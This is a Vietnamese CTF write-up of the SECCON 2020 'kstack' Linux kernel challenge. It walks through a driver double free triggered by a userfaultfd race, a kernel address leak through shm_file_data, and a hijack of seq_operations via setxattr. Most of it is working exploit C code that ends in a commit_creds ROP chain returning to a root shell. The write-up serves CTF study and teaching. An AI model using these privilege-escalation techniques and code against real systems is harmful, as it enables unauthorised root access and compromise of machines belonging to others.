# Kstack - SECCON CTF 2020 

File challenge bao gồm:

* `bzImage.old` : kernel `Linux version 4.19.98 (ptr@medium-pwn) (gcc version 8.3.0 (Buildroot 2019.11-git-00204-gc2417843c8)) #18 SMP Thu Oct 0`.

    (File `bzImage` là kernel mình build lại để debug).

* `rootfs.cpio`: initram

    (File `kstack.ko` là do mình build tương thích với kernel đã buikd, file `kstack.so.old` là file gốc của challenge).


* `start.sh`: QEMU start script, enable SMEP/KASLR.

* `src`: thưc mục chứa source code của driver kstack


## Phân tích:

```c
typedef struct _Element {
  int owner;
  unsigned long value;
  struct _Element *fd;
} Element;
```
* struct Element -> single link list, chứa thông tin owner và value.

```c
  case CMD_POP:
    for(tmp = head, prev = NULL; tmp != NULL; prev = tmp, tmp = tmp->fd) {
      if (tmp->owner == pid) {
        if (copy_to_user((void*)arg, (void*)&tmp->value, sizeof(unsigned long)))
          return -EINVAL;
        if (prev) {
          prev->fd = tmp->fd;
        } else {
          head = tmp->fd;
        }
        kfree(tmp);
        break;
      }
      if (tmp->fd == NULL) return -EINVAL;
    }
```
* `POP` 2 lần liên tiếp -> double free:
    1. Đầu tên ta `PUSH` một giá trị vào

       ```c
          int pid = task_tgid_nr(current);
          switch(cmd) {
          case CMD_PUSH:
            tmp = kmalloc(sizeof(Element), GFP_KERNEL);
            tmp->owner = pid;
            tmp->fd = head;
            head = tmp;
            if (copy_from_user((void*)&tmp->value, (void*)arg, sizeof(unsigned long))) {
              head = tmp->fd;
              kfree(tmp);
              return -EINVAL;
            }
       ```
       ta thấy vì có `tmp->fd = head;` và `head = tmp;` nên đây là `cycle single linked list`.
    2. Khi `POP` lần đầu, `prev` được init là `NULL` và `tmp` được init là `head` nên `head=tmp->fd` tức là bằng luôn chính nó, gọi tiếp `kfree(tmp)` (tức là `head` được free ) rồi break.
    3. Khi đó giá trị của `head` hiện tại không thay đổi ( được reference vào vùng vừa mới được free), khi `POP` lần nữa ta có bug double free.

=>

Vì vậy chiến thuật ban đầu là `double free` -> `push` -> `allocate kernel struct` -> `pop` để leak địa chỉ của kernel.

Để ý size của `struct Element` là 0x18 nên mình sẽ tìm struct kernel nào có size <= 0x20.

Tham khảo [blog này](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628) mình thấy struct [shm_file_data](https://elixir.bootlin.com/linux/v4.19.98/C/ident/shm_file_data) phù hợp nhất
```c 

struct shm_file_data {
	int id;
	struct ipc_namespace *ns;
	struct file *file;
	const struct vm_operations_struct *vm_ops;
};
```

```shm_file_data.ns``` trùng offset với ```Element.value``` từ đó ta leak được data base -> leak được text base.

Tuy nhiên làm mãi không leak được, sau một hồi check lại code hàm `proc_ioctl` có check `tmp->owner == pid` trước khi `copy_to_user`.

Vậy ta phải thay đổi chiến thuật.

* Trong case `PUSH`, khi `copy_from_user` không thành công thì `free(tmp)`:

    ```c 
        if (copy_from_user((void*)&tmp->value, (void*)arg, sizeof(unsigned long))) {
          head = tmp->fd;
          kfree(tmp);
          return -EINVAL;
        }
    ```
* Hàm `copy_from_user` bản thân là `heavy operation` nên liệu có thể tận dụng `race` và `pagefault` handle để trigger double free?
* Để ý `proc_file_fops.unlocked_ioctl = proc_ioctl` nên có thể tận dụng `race condition`.

* Bản thân Linux "khá lười", khi mmap một địa chỉ ảo nào đó ở user-mode, Linux chưa ánh xạ địa chỉ đó tới địa chỉ vật lý liền cho tới khi ta truy cập tới PAGE đó.
    * Ở đây là code mình demo:
    ```c
    int main(){
        u_int64_t len = 0x2000;
        char* addr = mmap((void *)0x13370000, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
        puts("Access 2nd!");
        addr[0x1001]=0x1337;
        getchar();
        puts("Access 1st!");
        addr[0]=0x1338;
        getchar();
    }
    ```
    * Mình mmap địa chỉ 0x13370000 mới size là 2 PAGE, mình truy cập PAGE 2 trước PAGE 1, bây giờ thử attach debugger vào xem điều gì xảy ra.
    * Ở đây ta thấy địa chỉ từ  0x13371000 đến 0x13372000 lại xuất hiện trước dù ta mmap địa chỉ 0x13370000, lý do là vì ta đã truy cập PAGE 2 trước nên PAGE 2 sẽ được ánh xạ và xuất hiện trên vùng nhớ ảo trước.
    ![](https://hackmd.io/_uploads/SkU3-yOV3.png)
    ![](https://hackmd.io/_uploads/S1L4f1OEh.png)
    * Bây giờ, ở những hàm như `copy_from_user`, khi mà hàm này cố gắng truy cập vào địa chỉ ảo ở user-mode chưa được ánh xạ, sẽ xuất hiện tượng `pagefault` , lúc này kernel sẽ gọi hàm để handle `pagefault` trước rồi sẽ cho hàm `copy_from_user` truy cập sau.
    * Ở Linux có [hàm syscall `userfaultfd`](https://man7.org/linux/man-pages/man2/userfaultfd.2.html) giúp ta handle pagefault ở user-mode.


Vậy chiến thuật để trigger `double free` là:

1. Hàm  `proc_ioctl` "cha" có case `CMD_PUSH`
2. Hàm `copy_from_user` được gọi ra với user-mode address chưa được ánh xạ.
3. Trigger handler pagefault ở user-mode được gọi ra.
4. Hàm handler này sẽ lại `PUSH`-> hàm `proc_ioctl` "con" `CMD_POP`
5. Vì hàm `proc_ioctl` "cha" đã được gọi với chạy tới line 30 nên `head` đã được gán một giá trị trỏ tới heap -> được free(head).
6. Return về hàm handler, ta gọi `mprotect` chặn quyền read-write, khi đó dù địa chỉ hợp lệ nhưng hàm `copy_from_user` vẫn trả về khác 0.
7. Return về `proc_ioctl` "cha", vì `copy_from_user` khác 0 nên `kfree(tmp)` được gọi ra, nhưng vì `tmp` = `head` nên ta free(heap) lần nữa -> double free.

Vậy còn chiến thuật leak?

* Đơn giản là allocate `shm_file_data` rồi free nó, khi allocate `Element` thì nó sẽ tự allocate lại địa chỉ vừa mới được free.

* Tuy nhiên để chắc chắn khi allocate `Element` sẽ được địa chỉ struct `shm_file_data` với mới free thì ta nên xài fork để khoảng thời gian giữa 2 operations này là rất ngắn.

Code:
```c 
#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002

typedef struct _Element {
  int owner;
  unsigned long value;
  struct _Element *fd;
} Element;

#define dev_char "/proc/stack"

int global_fd;
const char *buf[0x1000];
void dev_open(){
    global_fd = open(dev_char,O_RDWR);
    log_info("Opened dev char.");
}
int64_t read_buffer[0x20];
void pop(void* arg){
    ioctl(global_fd,CMD_POP,arg);
    log_info("Got value: 0x%lx",*(int64_t *)arg);
}
void  _push(void* arg){
    ioctl(global_fd,CMD_PUSH,arg);
    log_info("Pushed %p",arg);
    
}

static void call_shmat(void)
{
  int shmid;
  void *addr;
  pid_t pid;
  if((pid=fork()) == 0){
    if((shmid = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600))==-1)
      errExit("shmget fail");
    if((addr=shmat(shmid, NULL, SHM_RDONLY))==-1)
      errExit("shmat fail");
    if(shmctl(shmid, IPC_RMID, NULL)==-1)
      errExit("shmctl");
    log_info("Success call_shmat: %p", addr);
    log_info("Child is exiting...");
    exit(0);
  }
  wait(pid);
  log_info("Parent is returning...");
}
int64_t kernel_base;
int64_t data_base;
static void* fault_handler_thread(void *arg)
{
    log_info("Entered fault_handler_thread");
    static struct uffd_msg msg;   // data read from userfaultfd
    struct uffdio_copy uffdio_copy_var;
    long uffd = (long)arg;        // userfaultfd file descriptor
    struct pollfd pollfd;         //
    int nready;                   // number of polled events
    unsigned long hogebuf;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    log_info("Polling...");
    while(poll(&pollfd, 1, -1) > 0){
      if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
          log_err("poll");
      // read an event
      if(read(uffd, &msg, sizeof(msg)) == 0)
          log_err("read");
      if(msg.event != UFFD_EVENT_PAGEFAULT)
          log_err("unexpected pagefault");
      log_err("page fault: %p",(void *)msg.arg.pagefault.address);
      log_info("pop before push");
      pop(&hogebuf);
      data_base = hogebuf - 0x37bc0;
      kernel_base = data_base - 0xc00000;
      log_info("Data base: 0x%lx",data_base);
      log_info("Text base: 0x%lx",kernel_base);


      mprotect(msg.arg.pagefault.address & ~(PAGE-1),PAGE,PROT_NONE);
      log_info("Mprotect -> PROT_NONE");
      //Stop polling
      uffdio_copy_var.src = buf;
      uffdio_copy_var.dst = msg.arg.pagefault.address & ~(PAGE-1);
      uffdio_copy_var.len = PAGE;
      uffdio_copy_var.mode = 0;
      if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy_var) == -1)
        errExit("ioctl-UFFDIO_COPY");
      break;
    }
    log_info("Exit fault_handler_thread");
}

char *addr = 0x117117000;    // memory region supervisored
const unsigned long len = PAGE*0x10;  // memory length
void register_userfaultfd_and_halt(){
    log_info("Registering userfaultfd...");

    long uffd;  // userfaultfd file descriptor
    pthread_t thr; // ID of thread that handles page fault and continue exploit in another kernel thread
    struct uffdio_api uffdio_api_var;
    struct uffdio_register uffdio_register_var;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // create userfaultfd file descriptor
    if(uffd==-1){
        log_err("userfaultfd");
        exit(-1);
    }
    // enable uffd object via ioctl(UFFDIO_API)
    uffdio_api_var.api = UFFD_API ;
    uffdio_api_var.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api_var) == -1){
        log_err("ioctl-UFFDIO_API");
        exit(-1);
    }
    log_info("Mapping...");
    addr = mmap(addr, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
    log_info("Mapped");
    if(addr == MAP_FAILED){
        log_err("mmap");
        exit(-1);
    }
    // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
    uffdio_register_var.range.start = addr;
    uffdio_register_var.range.len = PAGE*0x10;
    uffdio_register_var.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register_var) == -1){
        log_info("ioctl-UFFDIO_REGISTER");
        exit(-1);
    }    
    s = pthread_create(&thr, NULL, fault_handler_thread, (void*)uffd); // create thread
    if(s){
        log_err("pthread_create");
        exit(s);
    }
    log_info("Registered userfaultfd");
}
//pagefalut
//1 page = 0x1000 bytes;
// mmap(0x1337000,...., R & W) -> 0x1337000
//  *(char *)0x1337000 = 0 -> pagefalut -> mmap address -> *(char *)0x1337000 = 0
//                          *----------------------------* -> kernel
// userfaultfd
// *(char *)0x1337000 = 0 -> pagefalut -> userfaultfd -> mmap address -> *(char *)0x1337000 = 0
//                                          |--->  mprotect(0x13337000, READONLY)
int main(int argc, char **argv,char **envp){
    dev_open();
    register_userfaultfd_and_halt();
    sleep(1);
    call_shmat(); // kalloc and kfree shm_file_data structure at kmalloc-32
    log_info("Trying push....");
    _push(addr); // invoke fault
    return 0;
}
```

Mình sẽ không giải sâu vào hàm `register_userfaultfd_and_halt` [vì ở man page của userfaultfd đã có file `userfaultfd_demo.c`](https://man7.org/linux/man-pages/man2/userfaultfd.2.html) giải thích khá rõ ( thực ra mất gần 1 tuần để mình hiểu sơ :) , mình giải thích phần chính là 
```c
      log_info("pop before push");
      pop(&hogebuf);
      data_base = hogebuf - 0x37bc0;
      kernel_base = data_base - 0xc00000;
      log_info("Data base: 0x%lx",data_base);
      log_info("Text base: 0x%lx",kernel_base);


      mprotect(msg.arg.pagefault.address & ~(PAGE-1),PAGE,PROT_NONE);
```
để ta đọc lại data của struct `shm_file_data` vừa mới free, gọi mprotect chặn quyền RW để `copy_from_user` fail.

Khi có được double free, mình tìm struct kernel nào có size <=0x20 mà có function pointer để ta kiểm soát.

Mình sẽ lấy [struct seq_operations dựa vào blog này](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#seq_operations).
```c 
struct seq_operations {
	void * (*start) (struct seq_file *m, loff_t *pos);
	void (*stop) (struct seq_file *m, void *v);
	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
	int (*show) (struct seq_file *m, void *v);
};
```

Khi ta xài `PUSH` thì ta có thể ghi đè được `stop`, tuy nhiên mình không tìm được hàm nào ở user-mode có thể gọi thẳng hàm này ra (chắc do non).

May mắn ở đây là có hàm [`setxattr`](https://elixir.bootlin.com/linux/v4.19.98/source/fs/xattr.c#L413):
```c
static long
setxattr(struct dentry *d, const char __user *name, const void __user *value,
	 size_t size, int flags)
{
    ...
	if (size) {
		if (size > XATTR_SIZE_MAX)
			return -E2BIG;
		kvalue = kvmalloc(size, GFP_KERNEL);
    ...
```
Khi đó ta ghi đè `seq_operations.show` rồi ở user-mode gọi hàm read để gọi `seq_operations.show`

Do có SMEP nên mình sử dụng kĩ thuật `KPTI trampoline` (dù không có `kpti` nhưng vì không tìm ra opcode `swapgs ; ... ; ret` thích hợp ).
Chi tiết về kĩ thuật này có thể tham khảo tại [đây](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#adding-kpti).

```c 
    int64_t* stack_ = mmap(0x5D006213 & ~(PAGE-1),0x3000,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0);
    stack_[0]=69;
    *(stack_+0x1000/8)=0;
    int64_t* rop = 0x5D006213;
    register_userfaultfd_and_halt();
    sleep(1);
    call_shmat(); // kalloc and kfree shm_file_data structure at kmalloc-32
    log_info("Trying push....");
    _push(addr); // invoke fault
    u_int64_t off = 0;
    rop[off++] = kernel_base + 0x22dd4c; // pop rdi ; ret
    rop[off++] = 0;
    rop[off++] = kernel_base + 0x69e00; // prepare_kernel_cred
    rop[off++] = kernel_base + 0x22dd4c; // pop rdi ; ret
    rop[off++] = 0;
    rop[off++] = kernel_base + 0x17bf6d; // add rdi,rax ; mov rbx,QWORD PTR [rbp-0x30]; mov QWORD PTR [rbx],rdi; add rsp,0x8; pop ..
    rop[off++] = 0;
    rop[off++] = 0; //dummy rbx
    rop[off++] = 0; //dummy r12
    rop[off++] = 0; //dummy r13
    rop[off++] = 0; //dummy r14
    rop[off++] = 0; //dummy r15
    rop[off++] = 0; //dummy rbp
    rop[off++] = kernel_base + 0x69c10; // commit_creds
    rop[off++] = kernel_base + 0x600a34 + 22;// swapgs_restore_regs_and_return_to_usermode+22
    rop[off++] = 0; // dummy rax
    rop[off++] = 0; // dummy rdi
    rop[off++] = get_shell;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;
    int sfd;
    if((sfd = open("/proc/self/stat", O_RDONLY)) == -1)
        errExit("single_open");
    int64_t hehe[4];
    hehe[3] = kernel_base + 0x1e0c40; // mov esp, 0x5D006213 ; ret
    setxattr("/tmp", "cacBANcheCUOI", hehe, sizeof(hehe), XATTR_CREATE);
    read(sfd, buf, 0x10);
```
